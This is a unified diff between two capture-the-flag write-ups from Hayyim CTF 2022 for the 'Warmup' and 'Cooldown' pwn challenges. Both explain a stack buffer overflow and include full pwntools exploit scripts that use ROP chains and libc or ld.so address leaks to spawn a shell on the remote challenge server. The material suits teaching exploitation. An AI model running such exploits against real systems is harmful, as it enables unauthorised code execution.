@@ -1,62 +1,47 @@
-#### **Warmup,**
+#### **Cooldown,**
 
-.
 
-well..
+"the return"
 
-as its name indicates Warmup was a warmup pwn challenge from Hayyim CTF 2022.
+as its name indicates (or not?) Cooldown was the successor of warmup challenge from Hayyim CTF 2022.
 
-Hayyim CTF had very good challenges, but I did not have time to participate..(I was working on defcamp CTF at the same time)
+Cooldown only difference with warmup, is that this time we have only a buffer overflow of 0x60 bytes
 
-I will do a small write up for people beginning with pwn, as it is very simple to exploit actually..
+as you can see in the reverse:
 
-ok, so we have this small program, with an obvious buffer overflow, and very few gadgets..
+![IDA Reverse](https://github.com/nobodyisnobody/write-ups/raw/main/Hayyim.CTF.2022/pwn/cooldown/pics/reverse.png)
 
-let's look at the reverse:
+the smaller size of the buffer overflow, leaves us only 5 ROP gadgets possible after the pop rbx.
 
-![IDA Reverse](https://github.com/nobodyisnobody/write-ups/raw/main/Hayyim.CTF.2022/pwn/warmup/pics/reverse.png)
+Which is not enough to do the exploitation in the same way that for warmup challenge.
 
-ok , we can see that the vuln function, reserve 0x30 bytes on stack for his input,
+So we will change of strategy.
 
-and read 0xC0 bytes in it from the user..  obviously too much..
+we will do our leak exfiltration in 10 rounds.. slowly by slowly advancing on stack, until we read a ld.so address left there by the "Spirits of Pwn"...
 
-We will do the exploitation in two rounds, but the payload will be send in one time.
+at each round, we will send a payload that looks like this:
 
-At the end of the vulnerable function, stack is increased of 0x30 bytes, than rbx is popped from stack, and there is the ret.
+```payload = p64(0)*6+p64(0x601018)+p64(exe.sym['write'])+p64(0x40053e)```
 
-![.bss memory](https://github.com/nobodyisnobody/write-ups/raw/main/Hayyim.CTF.2022/pwn/warmup/pics/memory.png)
+it basically call write function in plt, the filedescriptor will be 0 after the read call (stdin so)..
 
-When examining the .bss memory above, you can see that there are 3 libc addresses that we can leak, stdin, stdout & stderr,
+but it will work remotely, as in general the filedescriptor remotely is a socket, and writing to stdin will work remotely..(old trick)
 
-and one thing important too, that memory zone is writable (it is .bss)
+And instead of returning at the beginning of the vuln function, we will return after the push rbx instruction,
 
-What we do first, is to set rbx to points to 8 bytes before stderr, at 0x601018, then we return to 0x40055d.
+like this at each round, we will advance on stack..
 
-At the end of the vuln function, rdi, rsi and rdx are set correctly by the last read, so when we jump to 0x40055d,
+We do this until we read a ld.so address on stack, that we have seen on gdb...
 
-the content of the stack will be dumped, and just after the call to write, rsi will be set to the value in rbx that we set before.
+Once we got our leak, we calculate libc base, that is mapper at a constant offset before ld.so.
 
-So now, the next read will be on this zone pointed by rbx (and now rsi) , that is the address 8 bytes before stderr on bss.
+then we send a small ROP that calls system('/bin/sh')
 
-So with the next read, we fill the 8 bytes before stderr, and stop just before. We send just 8 bytes this time so..
+and we will get our precious flag...
 
-And our ROP; return again to 0x40055d, so that time the value of stderr will be leaked.
+here is the exploit code:
 
-see the leaked stderr libc address , after the 8 chars 'A' we sent:
-
-![leaked stderr address](https://github.com/nobodyisnobody/write-ups/raw/main/Hayyim.CTF.2022/pwn/warmup/pics/leak.png)
-
-With that value, we will calculate the remote libc mapping address.
-
-and this time we will return to the beginning of the vuln function at 0x40053d, to set rsi to point on stack again..
-
-and to send our last payload, that will contain only a single onegadget value.
-
-We could also have send a system('/bin/sh') now that we know libc remote address...
-
-here is the exploit so...
-
-```python3
+```python
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 from pwn import *
@@ -67,52 +52,49 @@ context.log_level = 'info'
 def one_gadget(filename, base_addr=0):
   return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]
 
-exe = ELF('./warmup')
+exe = ELF('./Cooldown')
 libc = ELF('./libc.so.6')
 
-host, port = "141.164.48.191", "10001"
-
 if args.REMOTE:
+  host, port = "141.164.48.191", "10005"
+
+if (args.REMOTE or args.DOCKER):
   p = remote(host,port)
 else:
   p = process(exe.path)
 
+# dumps ten times the stack, each time 8 bytes further on stack.. until we reach ld.so address on stack
+count = 10
+buff = ''
 
-# 1st round , set rbx = 0x601018 point 8bytes before stderr address on .bss
-payload = 'A'*0x30+p64(0x601018)+p64(0x40055d)+p64(0)*6
-# 2nd round, now rsi will point to 0x601018 (that we pass at the 1st round in rbx, and we will dump stderr value)
-payload += p64(0x601018)+p64(0x40055d)+p64(0)*6+p64(0x601018)+p64(0x40053d)
+for i in range(count):
+  payload = p64(0)*6+p64(0x601018)+p64(exe.sym['write'])+p64(0x40053e)
+  p.sendafter('> ', payload)
+  buff  = p.recv(0x60)
+  print(hexdump(buff))
 
-p.sendafter('> ', payload)
-buff  = p.recv(0xc0)
+# get our ld.so leak & calculate libc base with it
+ldso = u64(buff[0x48:0x50])
+print('ldso leak = '+hex(ldso))
+libc.address = ldso - 0x3f1000
+print('libc base = '+hex(libc.address))
 
-# write 8 bytes just before stderr address on .bss
-p.send('A'*8)
-# receive out stderr leak
-buff  = p.recv(0xc0)
-print(hexdump(buff))
-leak = u64(buff[0x8:0x10])
-print('leak = '+hex(leak))
-libc.address = leak - libc.symbols['_IO_2_1_stderr_']
-print('libc.address = '+hex(libc.address))
-
-# write again 8 bytes just before stderr address on .bss
-p.send('A'*8)
-
-# now that we know remote libc mapping address, we send a onegadget for our final payload, that will do system('/bin/sh')
-onegadgets = one_gadget('libc.so.6', libc.address)
-payload = 'A'*0x30+p64(0x601018)+p64(onegadgets[1])+p64(0)*10
+# do a simple system('/bin/sh')
+rop = ROP(libc)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret = rop.find_gadget(['ret'])[0]
+bin_sh = next(libc.search('/bin/sh'))
+payload = p64(0)*6+p64(0x601018)+p64(pop_rdi)+p64(bin_sh)+p64(libc.symbols['system'])
 p.sendafter('> ', payload)
 
-# enjoy shell
+p.sendline('id;cat flag*')
 p.interactive()
 ```
 
-seeing is believing...
+and off course, see it in action.. :)
 
-![shell is coming..!!](https://github.com/nobodyisnobody/write-ups/raw/main/Hayyim.CTF.2022/pwn/warmup/pics/gotshell.gif)
+![we got a shell](https://github.com/nobodyisnobody/write-ups/raw/main/Hayyim.CTF.2022/pwn/cooldown/pics/gotshell.gif)
 
-*nobodyisnobody still pwning things*  (like a ghost in the machine..)
+and that's all !!
 
-
-
+*nobodyisnobody still pwning things*   (until the world ends..)
